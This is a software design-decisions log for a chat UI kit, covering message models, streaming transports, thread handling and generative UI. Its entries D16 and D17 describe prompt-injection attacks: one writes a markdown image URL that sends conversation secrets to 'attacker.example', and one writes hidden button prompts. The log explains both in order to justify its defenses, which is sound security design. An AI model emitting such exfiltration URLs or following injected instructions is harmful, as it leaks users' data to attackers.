# Design Decisions

This log records the significant design choices in Hoist Chat Kit and the reasons for them. Each
entry states the decision, the context, and the alternatives we rejected. Add new entries at the
end. When a later decision replaces an earlier one, mark the old entry as superseded and link to
the new one.

## D1. A standalone package that follows Hoist's own conventions

**Decision.** The kit is its own npm package, `@xh/hoist-chat-kit`, with `@xh/hoist` as a peer
dependency. It ships TypeScript and SCSS source, as hoist-react does. Its code follows the Hoist
conventions in full: `HoistModel` for state, `hoistCmp` components with element factories, TC39
decorators, and `xh-` BEM class names.

**Why.** Chat UIs change faster than the rest of Hoist, so the kit needs its own release cycle.
Apps compile it with their own build, together with Hoist, so the kit adds no build step of its
own.

## D2. The kit owns its message model, and protocols plug in as adapters

**Decision.** A message is an immutable `ChatMessage` that holds an ordered list of typed parts:
text, reasoning, tool call, file, source and data. Components render this model only. No
component sees a provider's or a protocol's wire format.

**Why.** The agent-to-UI protocols are young and still move. AG-UI reached 1.0 in October 2026,
and A2UI is a release candidate. Our own model keeps that churn out of app code. The part types
and the tool call states follow the Vercel AI SDK `UIMessage` vocabulary, which most chat
libraries share. That keeps each adapter small.

**Alternatives.** Use AG-UI messages or AI SDK messages as the model. Both would tie apps to one
protocol and to its release cycle.

## D3. Messages are immutable records, replaced on change

**Decision.** `ChatModel.messages` is an `@observableRef` array of immutable `ChatMessage`
objects. Each streamed change makes a new message and new objects for the changed parts only.

**Why.** This follows the Hoist `StoreRecord` precedent. Memoized components then re-render only
the message and the part that changed. Plain records also serialize for storage with no extra
code.

**Alternatives.** Observable message objects that mutate in place. That is more MobX-native, but
it needs class instances for every part and custom serialization.

## D4. AG-UI 1.0 events are the wire vocabulary

**Decision.** Transports yield `ChatEvent`s. These are the AG-UI 1.0 events, with the same type
strings and field names. The kit mirrors the types and does not depend on `@ag-ui/*` at runtime.
Kit-specific content travels as AG-UI `CUSTOM` events with the `xh.chat.` name prefix.

**Why.** AG-UI is MIT-licensed, and agent frameworks such as LangGraph, Mastra, Pydantic AI and
Google ADK emit it. Its events map almost one to one onto our parts. Any AG-UI server therefore
works with the kit and needs no adapter. A Hoist server can emit the same events as NDJSON, so we
do not invent a protocol of our own.

**Alternatives.** A kit-native event format. That adds one more protocol for server authors to
learn and gives no interop. A runtime dependency on `@ag-ui/core` pulls in `zod` as a peer for
types we can mirror in one file.

## D5. Codecs translate wire formats, transports carry them

**Decision.** A `ChatTransport` gets events from a backend. A `ChatCodec` encodes the request
body and decodes the records that come back. `HoistChatTransport` reads NDJSON with
`XH.fetchNdjson`. `SseChatTransport` reads Server-Sent Events (SSE). `AgUiCodec` speaks AG-UI.
`AnthropicCodec` speaks the Anthropic Messages API.

**Why.** Framing (NDJSON or SSE) and format (AG-UI or Anthropic) change independently. With
`AnthropicCodec`, a Hoist server can relay Anthropic's stream line by line and translate nothing.
The translation then lives once, in tested TypeScript, rather than in each app's server.

## D6. NDJSON through `XH.fetchNdjson` is the default transport

**Decision.** `HoistChatTransport` posts to a hoist-core endpoint and reads the reply with
`XH.fetchNdjson`. D14 covers how it cancels a stream.

**Why.** It reuses Hoist's auth, correlation IDs, tracing, activity tracking and error decoding.
Hoist apps already have a hoist-core server, and `renderNDJSON` already pairs with
`fetchNdjson`.

**Gap.** `BaseController.renderNDJSON` flushes after the first row, then every 32 KB. Token
streaming needs a flush after each line, so the Toolbox controller writes the stream itself. A
streaming option for hoist-core, with a flush per line and disconnect detection, would remove
that code from every app.

## D7. The client runs the tool loop

**Decision.** `ChatModel` runs the agent loop for client tools. When a model call ends with tool
calls that have a client `execute`, the model runs them, sends the results back, and starts the
next call, up to `maxSteps`. Tools the backend runs arrive with their results in the stream, and
the model only displays them.

**Why.** Many chat tools act on the app itself: they change a dashboard or open a view. Only the
browser can run those. The Toolbox weather agent works this way. A server-side agent loop still
works, because the backend then sends both the calls and the results.

## D8. Generative UI goes through data parts and a renderer registry

**Decision.** AG-UI `ACTIVITY_SNAPSHOT` events and `xh.chat.data` events become `data` parts. An
app renders them through `ChatModelConfig.dataRenderers`, keyed by `dataType`. A data part with no
renderer shows as JSON. The kit ships no A2UI, OpenUI or MCP Apps renderer in v1.

**Why.** A2UI v1.0 is a release candidate with no official React renderer. OpenUI is
vendor-driven. A correct MCP Apps host needs a sandbox origin and a postMessage bridge, which
need security review. The seam lets each of these plug in later with no change to the core.

**Note.** "Open UI" in the brief is taken to mean Thesys OpenUI, the generative UI framework.
The W3C Open UI group standardizes HTML controls and does not relate to agents.

## D9. Desktop components first, platform-neutral models

**Decision.** v1 ships desktop components only, in `desktop/cmp/chat`. `core/`, `transport/` and
`cmp/` do not import from `@xh/hoist/desktop`.

**Why.** The first consumers are desktop dashboards. A mobile package can follow with no change
to the models.

## D10. CSS class and variable names use the `xh-chat` prefix

**Decision.** Class names are `xh-chat-*` in BEM form. Theme variables are `--xh-chat-*`, with
defaults built from Hoist variables.

**Why.** The `xh-` prefix marks XH library code. The kit is an XH library, and the `chat`
segment keeps it clear of names that hoist-react may add.

## D11. CodeQL runs only when the repo is public

**Decision.** The CodeQL job checks the repo visibility and skips its analysis while the repo is
private.

**Why.** Code scanning on a private repo needs GitHub Code Security, which this repo does not
have. The check turns the scan on by itself when the repo goes public.

## D12. The build check packs the package

**Decision.** `pnpm build` packs the package and checks the contents. Every source package must
ship, and specs and planning files must not.

**Why.** The kit ships source, so there is no compile output to build. A missing `files` entry
is the failure a source package is most likely to ship by mistake.

## D13. Finish reasons use the Vercel AI SDK vocabulary

**Decision.** A codec maps the provider's stop reason to one of `stop`, `length`, `tool-calls`,
`content-filter` or `other`, and records it as `metadata.finishReason` on the assistant message.
The raw provider value goes in `metadata.stopReason`.
`ChatModel` adds one value of its own, `max-steps`, for a turn that hit its `maxSteps` limit.

**Why.** Apps that show "the reply was cut off" or "the model declined" need one set of values
across providers. The AI SDK set is the one most chat code already knows.

## D14. Streams abort through `fetchOpts.signal`, not `autoAbortKey`

**Decision.** `HoistChatTransport` and `SseChatTransport` pass their own `AbortSignal` to the
native fetch through `fetchOpts.signal`. They combine it with the turn's signal through
`AbortSignal.any`.

**Why.** Hoist releases an `autoAbortKey` as soon as the response headers arrive. After that,
`XH.fetchService.abort(key)` returns false and the body keeps streaming, so the server keeps
generating tokens. A signal on the native fetch cancels the body too.

**Cost.** `AbortSignal.any` needs a 2024-or-later browser. That is inside the default Hoist
targets, which hoist-dev-utils sets to the last 2 versions of Chrome, Safari, iOS and Edge. The
signal replaces Hoist's own aborter, so Hoist's `timeout` can reject a request but not abort its
fetch. The transport closes the connection itself in that case. A `signal` option on Hoist's
`FetchOptions`, with abort support for streamed responses, would let the transports drop the
workaround.

**Status.** Filed as [xh/hoist-react#4855](https://github.com/xh/hoist-react/issues/4855).

## D15. Generative UI is a Hoist component catalog, with protocols as translators

**Decision.** The next deliverable after the chat UI is a generative UI registry. An app
registers Hoist components, such as a grid, a chart or a card, each with a typed props schema.
The kit generates the model's instructions and tools from the catalog, checks each spec the
model writes against it, and renders the result inline in the chat. Protocols such as OpenUI
Lang and A2UI translate into the same catalog specs through an adapter. v1 ships the seam
(`data` parts and `dataRenderers`) and points in this direction. The full registry follows.

**Why.** A client chose OpenUI because Hoist had no answer for chat and generative UI. The chat
UI answers the first half. The second half needs generative UI built on Hoist's own grids and
charts, which are stronger than generic component kits for data-dense apps. A catalog the app
controls keeps the model to known components and known props. XH has a proof of concept that
renders Hoist grids and charts inline in a chat in this way, under tight constraints.

**Update.** The catalog shipped in v1, as designed here: `ChatUiCatalog` in `genui/`, with the
built-in grid, chart, metrics and card in `desktop/cmp/genui/`. Each component is an inline
client tool, so streaming, validation and errors reuse the tool machinery. `ChatUiAdapter` is
the seam for A2UI and OpenUI. The kit ships the interface, and no adapter.

## D16. Markdown images do not load by default

**Decision.** `ChatMarkdown` does not load markdown images unless `allowImages` permits them.
A blocked image renders as a link, labeled with its alt text, that the user can choose to open.
An app allows images with `true`, or with a function that decides by source URL. `ChatPanel`
and `ChatMessageList` pass the setting through.

**Why.** An image sends a request to its URL the moment it renders, with no action by the user.
A prompt injection in a web page, a document or a tool result can tell the model to write an
image whose URL holds data from the conversation, such as
`![](https://attacker.example/?d=<secret>)`. The request then sends that data to the attacker's
server. Published attacks on LLM chat products have used this channel. A link needs a click,
so the user sees the URL first.

**Cost.** A model that draws charts or diagrams as markdown images shows links until the app
allows its image host. Apps that show trusted images should allow their own URLs with a
function, not all images with `true`.

**Alternatives.** Strip images entirely, with `disallowedElements`. That hides the alt text,
and the user cannot tell that the reply had an image.

## D17. A card action shows exactly what it sends

**Decision.** The built-in card's follow-up actions send their `prompt` as the user's own
message. The button's tooltip shows the prompt before the click, and the chat shows it as the
user's message after it. A prompt is at most 200 characters.

**Why.** The model writes both the button text and the prompt. The threat is the one in D16: a
prompt injection in a web page, a document or a tool result can steer what the model writes. It
could label a button "Show trades" and make its prompt an instruction the user never meant to give.
One example tells an agent to send data somewhere. A click then sends that instruction with the
user's authority. If the user sees the whole prompt before and after the click, the button cannot
claim one thing and send another unseen. The length cap keeps the whole prompt readable in a
tooltip, and leaves no room to hide a long instruction behind a short one.

**Cost.** A model cannot attach hidden context to an action. It writes the prompt as the user
would say it, and keeps any detail it needs in the conversation.

**Alternatives.** Put the prompt in the composer for the user to send. That adds a step to every
action, and the user still has to read the prompt. Show only the tooltip. A user who does not
hover would not see the prompt before it goes.

Amended by [D56](#d56-fixes-from-review-5-of-generative-ui): a `send` action may carry a small,
visible `context` of record ids.

## D18. Generative UI names carry the `ChatUi` prefix

**Decision.** Every public generative UI name starts with `ChatUi` or `chatUi`. Types are
`ChatUiCatalog`, `ChatUiComponentSpec`, `ChatUiGridSpecProps` and `ChatUiGridSpecOptions`.
Components are `ChatUiGrid` and its factory `chatUiGrid`. The functions that return catalog
specs are `chatUiGridSpec()`, `chatUiChartSpec()`, `chatUiMetricsSpec()` and `chatUiCardSpec()`.

**Why.** D10 gives kit names a prefix, so that they never collide with app or Hoist names. A
bare `gridComponent()` or `GridComponentProps` would sit beside an app's own grid code. The
`Spec` suffix says what the function returns, a `ChatUiComponentSpec`, and pairs it with the
component it renders.

**Alternatives.** `chatGridComponent()` and the like. It reads well alone, but adds a third
naming scheme beside `ChatUiGrid` and `ChatUiComponentSpec`, and hides that the result is a spec.

## D19. Two conversation shapes, both first-class

**Decision.** `ChatModel` gains `historyMode: 'client' | 'server'`, default `client`. Client mode
is the first slice's behavior: the browser holds the history and runs the tool loop. In server
mode the request carries only the new messages, a `trigger` (`submit`, `retry`, `regenerate` or
`edit`) and a stable `turnId`. The server's thread, message and run ids replace the browser's.

**Why.** Three enterprise apps reviewed the kit, and all three keep the conversation in a separate
agent service that owns the loop, the tools and the threads. None runs a tool in the browser. The
client shape still serves helper agents on Hoist components, so neither shape replaces the other.
Updates D7.

## D20. A thread layer in the kit

**Decision.** `ChatThreadStore` is an adapter the app implements against its backend: list,
load, rename and delete threads. `ChatThreadsModel` holds one `ChatModel` per open thread, so a
turn keeps running in the background while the user reads another thread. `chatThreadList`
renders the list. The concurrency rules one app's tests pin down become the model's spec.

**Why.** All three apps built a thread sidebar by hand, each with the same race bugs to avoid. A
store adapter keeps the kit out of each backend's storage format.

## D21. A workspace shell

**Decision.** `chatWorkspace` lays out a thread sidebar, the conversation and an optional side
panel, on Hoist `PanelModel`, sized to its parent.

**Why.** One app's largest cost was working around a third-party chat shell: CSS overrides, DOM
observers and a rebuilt composer. Another built the same layout on Hoist `Panel` by hand.

## D22. Generative UI binds data by reference, through four delivery modes

**Decision.** One catalog, delivered four ways: display tools that the server answers, client
tools (built), component tags in markdown, and a UI document in the text stream. A `ref` prop
names an artifact, such as a result set from a tool. The kit resolves it through an artifact
registry and an app-supplied `ChatDataSource` that fetches by page. The catalog exports its tool
schemas, prompt and a version hash, so a server agent can register it. Updates D15.

**Why.** In both apps that use generative UI, the model writes a view over data that a server tool
produced, and the client fetches and formats the rows. That keeps large data out of the token
stream and keeps numbers exact. A server-run loop also cannot take client tools.

## D23. An activity timeline, and one tool display setting

**Decision.** Agentic replies show their tool calls, reasoning and narration in one collapsible
timeline, with nested sub-agents. `ChatToolSpec.display` becomes one enum: `card`, `inline`,
`timeline`, `answer`, `pinned` or `hidden`.

**Why.** An agent that makes twenty calls per reply cannot show twenty cards, and both data apps
built a timeline by hand.

## D24. Bring your own LLM

**Decision.** A kit `ChatService` resolves a default transport from server config, so a helper
agent needs no wiring of its own. A `ChatCompletionsCodec` covers OpenAI-compatible gateways.

**Why.** Enterprises choose their own model and gateway, and most gateways speak the OpenAI chat
completions format. The codec and transport split (D5) is the seam that makes this cheap.

## D25. The hoist-core streaming companion belongs to hoist-core

**Decision.** The kit does not build `renderSSE()`, a streaming `renderNDJSON()` or a streaming
proxy mode. It keeps the documented relay controller in the transport README and in Toolbox, and
the report specifies what hoist-core should add.

**Why.** It is hoist-core code, owned by the hoist-core team.

**Status.** Filed as [xh/hoist-core#618](https://github.com/xh/hoist-core/issues/618).

## D26. Snapshots now, a beta tag when the v1.0 API settles

**Decision.** The kit keeps publishing `-SNAPSHOT` builds under `next`. An app that needs
stability pins an exact snapshot version, such as `1.0.0-SNAPSHOT.1791997893569`. The first tagged
pre-release (`1.0.0-beta.1`) follows when the plan 2 API settles.

**Why.** Exact snapshot versions are immutable on npm, so apps can pin today with no release
process. A tag earlier than that would promise a stability that the server-mode work is about to
break.

## D27. The Hoist floor is 89.0.0

**Decision.** The kit requires `@xh/hoist` 89.0.0 or later. Apps on 88 upgrade first.

**Why.** Hoist 89 is the first release with the unit test kit the kit's tests use, and it is now
released.

## D28. No Python reference agent in v1.0

**Decision.** The kit publishes its event contract (AG-UI plus `xh.chat.*`) and recorded streams
for conformance tests. It does not ship a Python reference agent.

**Why.** Agent services use many frameworks. A contract and recorded streams serve all of them,
and a service team can run them in its own CI.

## D29. AG-UI interrupts first for server-side human-in-the-loop

**Decision.** A server agent asks the user a question through the AG-UI interrupt outcome, and the
kit resumes the run with a structured answer. Where an agent cannot emit AG-UI interrupts, it
sends an `xh.chat.interrupt` custom event.

**Why.** AG-UI 1.0 standardizes the interrupt outcome and resume entries. A fallback keeps agents
on older adapters working.

## D30. Backend tool errors travel in the result's metadata

**Decision.** A `TOOL_CALL_RESULT` with `metadata.error` (the error text), or with
`metadata.isError: true` (the text as `content`), fails its call as `output-error`. An
`xh.chat.toolError` custom event does the same, for a backend that cannot set `metadata`.
`AnthropicCodec` maps a server tool result block that reports an error to the same failure.

**Why.** AG-UI's result event has no error field, so a failed backend tool showed as a success.
AG-UI's tool message has `error`, and `metadata.error` mirrors it. A custom event covers servers
on strict AG-UI libraries.

## D31. An error boundary around each message and each part

**Decision.** Each message, and each part within it, renders inside Hoist's `ErrorBoundary`. A
part that throws shows a compact note with a Details disclosure, and Hoist's exception handler
logs the error with no alert. A streaming part gets another try when its state changes, and a
data part when it is replaced.

**Why.** Renderers are app code and model-driven content, and one that throws took down the whole
list. Hoist's boundary keeps Hoist's logging. The retry on a state change lets a renderer that
throws on partial input recover, without a re-render on every flush.

## D32. The catalog refuses schema keywords it cannot check

**Decision.** The `ChatUiCatalog` constructor throws on any props schema keyword that affects
validity and that the checker does not implement, such as `$ref`, `allOf` or
`exclusiveMinimum`. It also compiles each `pattern`, and throws on one that does not compile.

**Why.** The catalog promises that the model passes only schema-valid props. A keyword the checker
skipped broke that promise unseen.

**Alternatives.** A full JSON Schema validator. It adds a dependency. Ajv, a common choice,
compiles each schema to code with `new Function`, which a strict content security policy
forbids.

## D33. File chips follow the markdown image policy

**Decision.** `ChatFileChip` loads an image at a URL only if `allowImages` permits it. An image
with inline `data` always shows.

**Why.** A backend file part with an image URL reopened the data leak that D16 closed. Inline data
loads nothing, so the user's own attachments need no policy.

## D34. A silent stream fails as a turn error, coded `stalled`

**Decision.** The HTTP transports take an `idleTimeout`. Any data resets it, including an SSE
comment or an `{"type": "xh.heartbeat"}` NDJSON record, which is never decoded. When it fires, the
transport closes the connection and yields `RUN_ERROR` with code `stalled`.

**Why.** Hoist's `timeout` covers only the wait for the response to start. A `RUN_ERROR` keeps the
stall in the conversation, with Retry, rather than an exception report. A heartbeat record lets an
NDJSON server keep a slow tool call alive without inventing an AG-UI event.

## D35. A send blocker returns the reason to wait

**Decision.** `ChatModelConfig.sendBlocker` returns why the user must wait, or null. The chat
reads it as a computed value. While it returns a reason, `canSend` is false, `sendAsync`,
`editMessageAsync`, `retryAsync` and `regenerateAsync` do nothing, and the composer disables Send
with the reason as its tooltip and as an accessible status. Resuming a paused turn (approve, deny,
or an interactive tool's answer) is not blocked, because it finishes a turn already under way.

**Why.** A reason, not a boolean, tells the user what to do next. Blocking `sendAsync` too keeps
suggestion chips and card actions from getting around the rule.

## D36. Inline calls show nothing until approved

**Decision.** An inline tool call renders no output while it waits for approval, unless its tool
sets `approvalPreview`. A denied call renders none.

**Why.** An inline call's output is the UI the user is asked to allow. Showing it before approval,
or after a denial, shows what the user has not agreed to.

## D37. A turn aborts with a `ChatAbortError` that names its reason

**Decision.** `ChatModel` aborts a turn's signal with a `ChatAbortError`, whose `reason` is a
`ChatAbortReason`: `stop`, `detach`, `clear`, `load` or `destroy`. Its `name` is `AbortError`.

**Why.** Section 2.4 of the server-mode spec passes the reason itself as the signal's `reason`.
But `signal.throwIfAborted()` and `fetch()` throw the reason as is. A bare string would then reach
Hoist's `FetchService`, which tells an abort from a network failure by the name `AbortError`, and
the kit's own abort checks. An error with that name keeps every abort an abort, and still says
why.

## D38. Only a stop cancels, and only a step in flight

**Decision.** `stop()` calls `ChatTransport.cancelAsync()` only while a step is in flight. It
passes a `ChatRunRef`: the thread id, the run id from `RUN_STARTED` (or else the step's own id),
the turn id, and the step's request. In server mode, a `detach()`, `clear()` or
`loadMessages()` with a step in flight marks the reply `metadata.detached`. A stop while a client
tool runs, or while the turn waits for the user, sends no cancel.

**Why.** Between steps no run is going on the server, so a cancel has nothing to stop, and a
detached flag would claim an answer the server is not writing. The request rides on the run ref
so that `HttpChatTransport.cancelUrl` can send the `headers` and `params` of the stopped step,
which the app builds from a request.

**Alternatives.** A separate header option for the cancel call. It duplicates `headers` for
every app that authenticates with an agent server.

## D39. A new thread's id may change once, on its first run

**Decision.** In server mode, a thread id is provisional until the first `RUN_STARTED` of the
thread. If that event reports another id, the chat adopts it. A thread starts with the
constructor, `clear()`, or `loadMessages()` with no thread id. A thread id given with history,
through `initialMessages` or `loadMessages()`, is the backend's and never changes.

**Why.** It covers both kinds of backend: one that takes the id the browser mints, and one that
mints its own on the first turn. Adopting only once keeps a misbehaving agent from moving a
thread that the thread layer has already keyed.

Amended by [D55](#d55-fixes-from-review-5-of-server-mode): history means messages with a user
message. A greeting alone leaves the id provisional.

## D40. `AnthropicCodec` is a client-mode codec

**Decision.** `AnthropicCodec.encodeRequest()` throws for a request with `historyMode: 'server'`.

**Why.** The Messages API keeps no state, so each request must carry the whole history. A
server-owned conversation sends only the new message, which the API cannot answer. The codec
cannot know the mode when it is built, so it throws on first use, with a message that names the
mode.

## D41. The text transform sees the raw text

**Decision.** The reducer keeps the raw text of each text part of a step, and passes all of it to
`textTransform` on each change. It stores the result. A turn that ends before its stream does
still gets a final call, with `isStreaming: false`.

**Why.** Suppose a transform ran on its own earlier output plus each new delta. It would see a
tag split across deltas in pieces, such as `<thin` and `king>`, and could never strip it. Running on the
raw text makes any pure transform correct, at the cost of one call per batch per changed part.

## D42. Small additions to the server-mode spec

**Decision.** WP 1 adds these to sections 1, 2 and 4.1 of `planning/SERVER-MODE.md`:

- `ChatModel.detach()`, a public way to abort with `detach`. The thread layer and apps need it to
  leave a turn running on the server.
- A turn that ends with `aborted` tracks as `Turn stopped`, beside `Turn complete` and `Turn
  failed`, so stopped turns stay visible in activity tracking. Each track also sets Hoist's own
  `elapsed`.
- `ChatModel.setFeedbackSubmitter()` and `canSubmitFeedback`, the seam through which
  `ChatThreadsModel` supplies its store's submitter to a chat the app built.
- `ChatModel.threadId` is a getter over a private observable, so only the chat sets it.
- `hasOlderMessages` is `@bindable`, so the thread layer sets it without an action of its own.
- `runOptions` is `@bindableRef`, and each send takes a deep copy. A deep observable would put a
  MobX proxy in message metadata.
- A retry, regenerate or edit re-runs with the run options recorded on its user message.
- `ScriptedRequestContext.stepIndex` stays, read from the request, because Toolbox demos use it.

**Why.** Each fills a gap the spec leaves open, without changing its contract.

## D43. The thread layer reaches a chat through three seams

**Decision.** `ChatModel` gains `setThreadCreator()` and `addSendBlocker()`, beside
`setFeedbackSubmitter()` (D42). The chat awaits its thread creator before the first request of a
new thread, in either history mode, and adopts the id it returns as it would one from
`RUN_STARTED`. A failed create fails the turn, with Retry. An added blocker holds back sends as the
configured `sendBlocker` does, and is checked after it. `ChatThreadsModel` shares one
`createThreadAsync` call per local id, and drops it only if it failed.

**Why.** Section 3.3 rule 5 needs the create awaited before the first run, but the app builds the
chat and its transport, so the thread layer cannot wrap either. The thread layer also needs to
block sends while history loads, after a failed load, and while another thread runs, on chats
that may have a `sendBlocker` of their own.

**Alternatives.** Create the thread when the user starts it. That would leave an empty row on the
backend for every New chat click.

## D44. A run that finishes with nothing fails, coded `empty-response`

**Decision.** The stream reducer fails a reply that has no parts when its run finishes. The turn
ends as an error, with Retry, in both history modes.

**Why.** Section 3.3 rule 9. Each chat guards its own turn, so the rule belongs in the chat, not
in the thread layer. A blank reply looked like a success and gave the user nothing to retry.

## D45. The thread list is a computed overlay

**Decision.** `ChatThreadsModel.threads` is a computed value, not the `@observableRef` field of
section 3.2. It joins the threads started here that the store has not listed yet, and the store's
own pages, then lays pending renames, pins and deletes over them by id. An edit stays laid over
the list until a list requested after its store call ended applies. A failed edit leaves the
overlay at once, which is the whole rollback. A list applies only if no newer list has, by a
request count of the model's own rather than `loadSpec.isStale`, so that further pages check the
same count.

**Why.** Rule 1, and the stale list that brought a deleted thread back in assistant-ui (#8194). A
list sent before a delete ended can still arrive after it. An overlay that outlives the store call
by one list covers that case, and a newer rename survives an older one that fails.

## D46. Small additions to the thread layer spec

**Decision.** WP 2 adds these to section 3 of `planning/SERVER-MODE.md`:

- `reloadThreadAsync()`, the Retry of rule 8. It also catches up on a turn that the backend
  finished on its own. `loadError` holds the selected thread's failure, and `listError` the last
  list failure, shown inline rather than as a toast.
- `selectedSummary`, `hasMoreThreads`, and `olderMessagesTask` beside `listTask` and `loadTask`,
  so that a list can show "loading older" without masking the conversation.
- `ChatSeedSpec` is `{draft, runOptions}`. Seed messages are left out, as a server-owned thread
  would lose them on reload.
- A chat that changes its thread id while busy has adopted the backend's id, and the model
  re-keys the thread. One that changes it while idle, through `clear()` or `loadMessages()`, holds
  a new thread, and the old thread stays in the list.
- A closed chat's draft and run options are kept by thread id, and restored when it opens again.
- Deleting threads stops any turn running in them. Deleting the selected thread selects a new one.
- A missing thread is a store error with `httpStatus` 404, as Hoist's `FetchService` reports it,
  or an empty page.
- A refresh asks for as many threads as the list holds, so loaded pages stay. A turn that ends
  reloads the list after one second, debounced across turns.
- With `allowConcurrentTurns: false`, sends, edits, retries and regenerations wait while another
  thread runs (D35). A paused turn can still resume.

**Why.** Each fills a gap the spec leaves open, without changing its contract.

## D47. Choices in the generative UI core

**Decision.** WP 7 step 1 builds sections 1 to 4 and 6 to 8 of `planning/GENUI-2.md`, with these
choices where the spec is open or differs from the kit's conventions:

- Components run actions with `context.runActionAsync()`, not `runAction()`, as every method
  that returns a promise takes the `Async` suffix.
- `tools` holds the component tools only. The document tool is `documentTool`, and the
  display-only specs for a server-run loop are `displayTools`. `toPrompt()` and `toToolSchemas()`
  default to the `tools` mode, so a catalog sends what it sent before.
- An element has at most one parent. A child listed under two parents renders twice, and a chain
  of such diamonds grows the render exponentially.
- The catalog reaches a chat's artifacts through its `artifacts` config, a function of the
  `ChatModel`. `ChatModel` does not change, and a later `ChatModelConfig.catalog` can supply the
  chat's own registry.
- A tag attribute for a prop that takes only strings keeps its text as written. For a prop that
  takes no strings, a number, boolean or null parses as JSON. An open tag closed at once, as
  `<ui-x ...></ui-x>`, counts as self-closing, and a backslash escapes a tag.
- `maxInlineRows` defaults to 500, so the built-in chart's 500 points pass. The element and depth
  caps default to 50 and 8.
- `openUrl` allows no URL until the app sets `urlAllowList`, and never one that is not `http` or
  `https`. A `send` action's context is capped at 2,000 characters of JSON.
- `callTool` runs a client tool of the chat, outside the history, and refuses a backend tool.
- `applyDataView()` throws for a view that names an unknown column. Its `totalRows` counts the
  rows that pass the filter, before `top`. A scaled column notes its `units`.
- `fallback` and `placeholder` on the catalog config let the desktop step draw both with Hoist
  components, as `genui` is platform-neutral.
- The card allows `send` actions only, unless its `actionTypes` option allows more.

**Why.** Each keeps the spec's contract, follows a kit convention, or closes a gap the spec leaves
open.

## D48. Only the latest reply with changes can be undone

**Decision.** `ChatModel.undoableMessageId` names the latest reply that holds undo functions, once
its turn ends, and only while no turn runs or waits for the user. `undoTurnAsync()` runs that
reply's undo functions, newest first. Once it is undone, the reply before it with changes becomes
undoable. If an undo function throws, the undo stops, a toast reports it, and the rest stay for
another try. A retry, regenerate, edit, clear or load drops the undo functions of the replies it
discards. An undo of a tool that finishes after a stop is still kept.

**Why.** Section 2.2 of `planning/HELPERS.md` keys undo by reply but does not say which replies
may undo. The tool groups build each undo from a snapshot of persistable state, so undoing an
older reply would also revert every later one. One undoable reply at a time keeps undo exact.

**Alternatives.** An Undo action on every reply with changes. It would silently revert later
replies.

## D49. Choices in the helper agent core seams and `ChatCompletionsCodec`

**Decision.** WP 9 steps 1 and 2 add these to sections 2 and 5.2 of `planning/HELPERS.md`:

- A context provider's `getContext` may return null, to send nothing for a step. A provider that
  throws fails the turn, with Retry. The chat skips the provider pass entirely when it has none,
  so a chat without providers starts each step as before.
- `AgUiCodec` sends a provider's description, or else its name, as the AG-UI `description`, and a
  string value as is. `AnthropicCodec` and `ChatCompletionsCodec` send each provider as a
  `<context name="...">` section. Placed in the system prompt at first, and moved after the
  history by [D55](#d55-fixes-from-review-5-of-server-mode).
- `ChatToolSpec.preview` is `boolean | (input) => ReactNode`. True replaces `approvalPreview`,
  which stays as an alias because the generative UI docs still name it, and another work package
  owns them.
- The desktop message view shows the Undo action, beside Regenerate.
- `ChatCompletionsCodec` finishes each step on the chunk with a `finish_reason`, because the
  `[DONE]` sentinel never reaches a codec. The usage chunk that follows becomes a second
  `RUN_FINISHED` with only `usage`, which the reducer already merges into the reply. Superseded by
  [D52](#d52-a-codec-sends-one-run_finished-per-step).
- It decodes `refusal` as text, and `reasoning_content`, which some gateways add, as reasoning. It
  sends no reasoning back, and prefixes a failed call's result with `Error:`, as the format has no
  error flag.

**Why.** Each fills a gap the spec leaves open, without changing its contract.

## D50. `ChatService` reads `chatConfig`, and its prompt is static text

**Decision.** The soft config is `chatConfig`, not `xhChatConfig`. `createTransport({system})`
takes the prompt as a string. An AG-UI backend gets it as a `context` entry.

**Why.** hoist-core reserves the `xh` prefix for its own configs, and asks apps to avoid it. The
app creates this config, so it follows the naming rule for app configs. A static prompt caches.
Live state goes through context providers, which work with every codec. `AgUiCodec` also builds
its context synchronously, so it could not await a prompt function.

## D51. Choices in the tool groups

**Decision.** WP 9 step 3 adds these to section 3 of `planning/HELPERS.md`:

- A group is a `ChatToolGroup` of `{tools, contextProvider, prompt, suggestions}`. Each tool's
  `parameters` is a getter, so its enums follow the model on every step with no change to
  `ChatToolSpec`.
- There is no list tool. The context provider sends the current columns or widgets on every step,
  and the dashboard prompt lists the widget types the model may add.
- The model can change a dashboard widget's settings only through a `settingsSchema` the app
  supplies per view spec. The tools check the keys, and leave the values to the widget.
- `gridTools` restores only the part of the grid a tool changed. `dashCanvasTools` restores the
  dashboard's persistable state, as the spec says.
- `move_widget` changes one widget's layout through `DashCanvasModel.onRglLayoutChange()`, the one
  public setter for a layout that keeps view ids. `loadState()` regenerates ids by position.
- `set_dashboard` does not ask first, as the Toolbox agent's equivalent did not. It is undoable.
  `clear_dashboard`, `reset_dashboard`, `reset_view`, `save_view` over the current view, and
  `open_view` with unsaved changes ask first.
- `save_view` waits 500 ms before it saves. A persistence provider debounces its writes by 250 ms
  by default, so the wait lets changes from earlier in the turn reach the view manager. Saves have
  no undo.

**Why.** Each keeps the spec's contract, or follows the Hoist API where the spec is silent.

## D52. A codec sends one `RUN_FINISHED` per step

**Decision.** `ChatCompletionsCodec` holds its `RUN_FINISHED` back until the usage chunk, or the
end of the stream, and sends one event with the usage. A `ChatDecoder` may add a `flush()`, which
the HTTP transports call after the last record of a stream that ended normally. The codec holds
the finish only with `includeUsage`, so a stream that asks for no usage finishes at once. This
replaces the second `RUN_FINISHED` of D49.

**Why.** AG-UI ends a run with one `RUN_FINISHED`, and the kit documents it as the last event of a
step. The reducer merged a second one, but any other reader of the stream, such as a relay or a
test, saw two finishes.

**Alternatives.** Wait for the usage chunk with no flush. A gateway that ignores `stream_options`
would then never finish, and every turn would fail as `incomplete-stream`.

## D53. `preview` replaces `approvalPreview`

**Decision.** `ChatToolSpec.approvalPreview` is deprecated. It still works, and `ChatModel` logs a
deprecation warning once for a tool that sets it. The generative UI docs name `preview: true`.

**Why.** `preview: true` does all that `approvalPreview` did, and `preview` also takes a function
of the input for a tool that renders no output of its own. Two options for one behavior split the
docs and the specs. D49 kept the alias only because another work package owned the docs.

**Alternatives.** Remove the alias at once. The kit has no release yet, but apps already build on
its snapshots, so a warning gives them a release to move.

## D54. Choices in the generative UI wiring of `ChatModel`

**Decision.** WP 7 step 1 wires a catalog into `ChatModel`, with these choices:

- The catalog's `modes` select its tools. A client-mode chat sends the component tools for
  `tools`, and the document tool for `document`. A server-mode chat adds the display tools for
  every mode. The modes also become the default of `toPrompt()` and `toToolSchemas()`, so the
  prompt and the tools agree.
- A catalog tool the app also lists in `tools`, as the same object, is added once. One that
